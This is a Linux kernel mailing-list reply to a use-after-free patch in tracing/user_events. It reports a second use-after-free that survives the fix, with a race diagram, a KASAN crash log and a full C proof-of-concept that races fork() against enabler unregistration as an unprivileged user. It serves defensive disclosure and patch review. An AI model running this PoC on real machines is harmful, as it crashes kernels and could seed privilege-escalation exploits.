Received: from out162-62-57-64.mail.qq.com (out162-62-57-64.mail.qq.com [162.62.57.64])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A208133BBD7;
	Mon, 22 Jun 2026 17:04:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.64
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782147851; cv=none; b=pDfi2CKqtnt49YJIOyFWVQiDzmk2fH0adAfM4WK8dV5COlawPyfthZMIjF26JJ16ccIgrKuvOobhlef7eDTwuuZrtzJ5daO/s6GKANZP7zt5DfaEpzuj1Xaan2AAbog2RPhyRj9fSPja2aNd7GqxDC+SlwqzwY/1kuTdXFhZGas=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782147851; c=relaxed/simple;
	bh=D1YyCXuNzbg5veKQZ2ct+cTQc0QSaKjj4XVquCkLrQo=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=gf16GDRDg+yEIpSJuCp/hpvRqjlou6f8RKXf0m4R7KFGGIQvP/ZHL5yi7TkcS4lSrBquJacWdmLH7GCuwfhKg4TEybEVkBg1TCH9lX8B2far1I3St7ppBVNrpMRbH7p/6CjYGngOmZMc9JxI3uGVbN7Tm8pXJs05j4lgyx7UT1M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=ThXu6CuP; arc=none smtp.client-ip=162.62.57.64
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="ThXu6CuP"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782147842; bh=MOP/KMXaYxcEyPoiWqHwhJXRGZLLJ/BohCPL+2fcHCw=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=ThXu6CuPeusUAD+d6/AVAP+oKwlZHHOrtpSJBXGHCQ8N6kTFmsDYjljErar+Soi5L
	 URYQAe4KplIfK1n7Gp4kOOYO6W3y4Xj8mpDfQgN57/xwggRc+LqCgGqUoSZFqv0Iaf
	 djau4IvSby1gnzPeCGHZIZA0+O68tYZfHml6T6NQ=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrsza53-0.qq.com (NewEsmtp) with SMTP
	id FB90E4B; Tue, 23 Jun 2026 01:03:59 +0800
X-QQ-mid: xmsmtpt1782147839tgfnb12g7
Message-ID: <tencent_89647CE40DC452B891C65C94D1B271DE8E07@qq.com>
X-QQ-XMAILINFO: MJf32pulH481B1nxRvGaM2zlzf9YRMoK4Ug5BFddXhBZ4tv9W1u7BXOp5pO4ZS
	 j5Vl8rlOrAS4xUPWmhrc0OFAd23MOkK/Qurh4iFXk++eX/mGwmUATWDAiPaljH2q9/uzk5Do98ED
	 n6wet/yNI2bg/B5F829fI8G3AJM3n/lJZVZTCNve1eo4LUaX/Oqqb6QU/xNn6PRESSq7leCJ+FrF
	 JPmJJvqpFJ3YrRUfD8cWcA7FfyBd/dsJ09PJrLaaBsA7TtlzvE2QlMetxOyMoyc88qE/jPB2UBrc
	 VimKck8Syb7ABq4Y4WWpjJ3+0SL/IXtaVOM2AZQGyZd3l0j2/qEIt8VuR8/KOQpw/KfZHMfx4XDH
	 Nu60GArEJqmECJfnavikiTo6CTJ5x/hkPPvNmRjoKtNG3QFtfBcaA7Okb0eZ3iHb+HlhLPPWc7EN
	 apW8CBNqcRkUTiL6rrdE59QHyd+AeLvSkmJk5W+ffVyMoWAwwvyqbuujZBIqKJV0Pn9ygDiQTFiH
	 AKsKXXaGx1fMZ3bPDwJEHYjtQKx75qRhvwzcpWO+EjTsCswSbwEu3qkYi6XjrqtCbfAAmmgcK4rX
	 WymFGKLmQdnv/pHEysD4ov7VfX4phcyH78rSN2oyge3yhawSW/R2FG/p7yKVm6+2MyvTyMfUE9Ir
	 3gOG4LeTgIn0ArF/bLA0Wb5BGtvrlMPWv4Zhso7wb68kV4R/3OPqrRInsh12a/ONYUNtoFti8j7b
	 jYSWjm51OINtieG8Yf+RvRgb/t9T5MB2ChF+7T6curIAWJ8S58ubCh/gv0y6H72T7CNMKKJsOstk
	 IOUQxdmCmKJu3iZckt4MdUG+QDsh1BDzi78pIdH/9NfWbKE3UdieVhGICjo1eJzfM9h3taiHZIIL
	 ZM3hxN5ZNONM82ho2OM9p3q/SL0NKzZag1OgsyupjVd7avg5kCH+Iconam98PbwsTeL/AoHU3cHF
	 DQv0jt+0c3va22P4kLbZRyptrg2gJZZHpIKIjs5nMPXSTdl6P1e66XwPw25SF37xRV1oef6nqeby
	 egZi9HZXolx/S0RqAhDWKuOYEaxmrjC9x3fNltrJ2twAdfOUsnWrR3zJJp1Oe5fO/zKyVHvQ==
X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
X-OQ-MSGID: <4a8051fe-2700-47e6-ac96-1fac2dcb12bb@qq.com>
Date: Tue, 23 Jun 2026 01:03:59 +0800
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH] tracing/user_events: fix use-after-free of enabler in
 user_event_mm_dup()
To: Michael Bommarito <michael.bommarito@gmail.com>,
 Steven Rostedt <rostedt@goodmis.org>, Masami Hiramatsu
 <mhiramat@kernel.org>, Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
Cc: Beau Belgrave <beaub@linux.microsoft.com>,
 linux-trace-kernel@vger.kernel.org, linux-kernel@vger.kernel.org,
 stable@vger.kernel.org
References: <20260618222743.538915-1-michael.bommarito@gmail.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260618222743.538915-1-michael.bommarito@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi,

I came across the Sashiko AI review [1] in this thread and wanted to
share some test results that may be useful.

First — thank you for this patch!  The enabler UAF in
user_event_mm_dup() is a real bug and the fix (kfree → kfree_rcu) is
the right approach for protecting the RCU list walkers.  The selftest
results you included in the commit are also really helpful.

However, I was able to reproduce a second UAF on the *user_event*
object that the Sashiko review flagged — it's still reachable after the
patch is applied.  I've included a PoC and crash log below.

On Thu, Jun 18, 2026 at 06:27:43PM -0400, Michael Bommarito wrote:
 > @@ -404,7 +407,12 @@ static void user_event_enabler_destroy(struct 
user_event_enabler *enabler,
 >      /* No longer tracking the event via the enabler */
 >      user_event_put(enabler->event, locked);
 >
 > -    kfree(enabler);
 > +    /*
 > +     * The enabler is removed from an RCU-traversed list
 > +     * (user_event_mm_dup walks mm->enablers under rcu_read_lock only),
 > +     * so the backing memory must outlive a grace period.
 > +     */
 > +    kfree_rcu(enabler, rcu);
 >  }

The issue: user_event_put(enabler->event, locked) is called
synchronously, before kfree_rcu(enabler, rcu).  If this drops the last
reference to the user_event, delayed_destroy_user_event() is scheduled
on a workqueue, which calls destroy_user_event() → kfree(user).  The
user_event memory is freed without RCU protection.

But the enabler itself is now protected by kfree_rcu — it remains
visible to RCU readers in user_event_mm_dup() during fork().  Those
readers access enabler->event (via user_event_enabler_dup →
user_event_get(orig->event)), which now points to freed memory:

   fork()                                       unregister
   ────────                                     ──────────
   user_event_mm_dup()
     rcu_read_lock();
     list_for_each_entry_rcu(enabler, ...)
  user_event_enabler_destroy()
  list_del_rcu(enabler)
  user_event_put(enabler->event)
                                                    → last ref!
                                                    → 
schedule_work(put_work)
                                                  kfree_rcu(enabler, rcu)
       user_event_enabler_dup(enabler, ...)     [workqueue]
         enabler->event =  delayed_destroy_user_event()
           user_event_get(orig->event);  destroy_user_event()
           ↑ UAF: orig->event was freed! kfree(user_event)

[Reproduction]

The PoC runs as an unprivileged user with access to
/sys/kernel/tracing/user_events_data.  It creates two threads sharing
the same mm:

   - fork_worker:  continuously calls fork()/waitpid(), which triggers
                   user_event_mm_dup() → RCU list walk
   - unreg_worker: continuously registers (DIAG_IOCSREG) and unregisters
                   (DIAG_IOCSUNREG) an event enabler, which calls
                   user_event_enabler_destroy()

The race window is small but reproducible within a few iterations on a
multi-CPU QEMU VM.

[Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]

   BUG: KASAN: slab-use-after-free in user_event_mm_dup+0x319/0x630
   Write of size 4 at addr ffff88802c786fa8 by task poc/29997

   Call Trace:
    <TASK>
    dump_stack_lvl
    print_report
    kasan_report
    kasan_check_range
    user_event_mm_dup+0x319/0x630
    copy_process+0x650f/0x8090
    kernel_clone+0x214/0x9c0
    __do_sys_clone+0xce/0x120
    do_syscall_64
    entry_SYSCALL_64_after_hwframe
    </TASK>

   Allocated by task 29998:
    kasan_save_stack
    __kasan_kmalloc
    __kmalloc_cache_noprof
    user_event_parse_cmd+0x721/0x2aa0
    user_events_ioctl+0xcc0/0x1d00
    __x64_sys_ioctl
    do_syscall_64

   Freed by task 5014:
    kasan_save_stack
    __kasan_slab_free
    kfree+0x165/0x710
    destroy_user_event+0x375/0x4f0
    delayed_destroy_user_event+0x8d/0x110
    process_one_work
    worker_thread
    kthread

   Last potentially related work creation:
    queue_work_on
    user_event_put+0x25d/0x460
    user_events_ioctl+0x1795/0x1d00
    __x64_sys_ioctl
    do_syscall_64

   ------------[ cut here ]------------
   refcount_t: addition on 0; use-after-free.
   WARNING: lib/refcount.c:25 at refcount_warn_saturate+0xf9/0x120
   Call Trace:
    user_event_mm_dup+0x349/0x630

The refcount warning on top of the KASAN report is a strong double
confirmation: user_event_get(orig->event) is trying to increment a
refcount on memory that has already been freed and zeroed.

The PoC is attached below.  It's a single C file, compiles with:

   gcc -o poc poc.c -static -lpthread

[1] 
https://sashiko.dev/#/patchset/20260618222743.538915-1-michael.bommarito%40gmail.com
     (Sashiko AI code review — "Use-After-Free", Severity: Critical)

Thanks,
XIAO

// PoC: user_event UAF on event object via user_event_mm_dup()
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <stdint.h>

#define DIAG_IOC_MAGIC  '*'
#define DIAG_IOCSREG    _IOWR(DIAG_IOC_MAGIC, 0, struct user_reg*)
#define DIAG_IOCSDEL    _IOW(DIAG_IOC_MAGIC, 1, char*)
#define DIAG_IOCSUNREG  _IOW(DIAG_IOC_MAGIC, 2, struct user_unreg*)

struct user_reg {
     uint32_t size; uint8_t enable_bit; uint8_t enable_size;
     uint16_t flags; uint64_t enable_addr; uint64_t name_args;
     uint32_t write_index;
} __attribute__((__packed__));

struct user_unreg {
     uint32_t size; uint8_t disable_bit; uint8_t __reserved;
     uint16_t __reserved2; uint64_t disable_addr;
} __attribute__((__packed__));

static volatile int stop_flag = 0;
static void *enable_page = NULL;
static const char *event_name = "poc_uaf_test";

static int open_fd(void)
{
     int fd = open("/sys/kernel/tracing/user_events_data", O_WRONLY);
     if (fd < 0)
         fd = open("/sys/kernel/debug/tracing/user_events_data", O_WRONLY);
     return fd;
}

static int do_reg(int fd, void *addr)
{
     struct user_reg reg = {0};
     reg.size = sizeof(reg);
     reg.enable_bit = 0;
     reg.enable_size = 4;
     reg.flags = 0;
     reg.enable_addr = (uint64_t)(unsigned long)addr;
     reg.name_args = (uint64_t)(unsigned long)event_name;
     return ioctl(fd, DIAG_IOCSREG, &reg);
}

static int do_unreg(int fd, void *addr)
{
     struct user_unreg unreg = {0};
     unreg.size = sizeof(unreg);
     unreg.disable_bit = 0;
     unreg.disable_addr = (uint64_t)(unsigned long)addr;
     return ioctl(fd, DIAG_IOCSUNREG, &unreg);
}

static void *fork_worker(void *arg)
{
     pid_t pid; int status;
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
     while (!stop_flag) {
         pid = fork();
         if (pid == 0) _exit(0);
         else if (pid > 0) waitpid(pid, &status, 0);
         else usleep(100);
     }
     return NULL;
}

static void *unreg_worker(void *arg)
{
     int fd;
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset); CPU_SET(2, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
     while (!stop_flag) {
         fd = open_fd();
         if (fd < 0) continue;
         /* Ensure an enabler exists, then unregister to destroy it */
         if (do_reg(fd, enable_page) < 0 && errno == EADDRINUSE) {
             do_unreg(fd, enable_page);
             do_reg(fd, enable_page);
         }
         close(fd);
         fd = open_fd();
         if (fd < 0) continue;
         do_unreg(fd, enable_page);
         close(fd);
         usleep(100);
     }
     return NULL;
}

int main(int argc, char **argv)
{
     pthread_t t_fork, t_unreg;
     int fd, i, iters = 30;
     if (argc > 1) iters = atoi(argv[1]);
     printf("[+] PoC: user_event UAF in user_event_mm_dup\n");
     printf("[+] Running %d iterations (3s each)\n", iters);
     enable_page = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     if (enable_page == MAP_FAILED) { perror("mmap"); return 1; }
     memset(enable_page, 0, 4096);
     fd = open_fd();
     if (fd < 0) { perror("open /sys/kernel/tracing/user_events_data"); 
return 1; }
     if (do_reg(fd, enable_page) < 0 && errno != EADDRINUSE) {
         perror("reg"); close(fd); return 1;
     }
     close(fd);
     printf("[+] Event initialized\n");
     for (i = 0; i < iters; i++) {
         printf("[+] Iter %d/%d\n", i+1, iters);
         /* Re-create enabler */
         fd = open_fd();
         if (fd >= 0) {
             if (do_reg(fd, enable_page) < 0 && errno == EADDRINUSE) {
                 do_unreg(fd, enable_page);
                 do_reg(fd, enable_page);
             }
             close(fd);
         }
         stop_flag = 0;
         pthread_create(&t_fork, NULL, fork_worker, NULL);
         pthread_create(&t_unreg, NULL, unreg_worker, NULL);
         usleep(3000000);
         stop_flag = 1;
         pthread_join(t_unreg, NULL);
         pthread_join(t_fork, NULL);
     }
     printf("[+] Done\n");
     return 0;
}

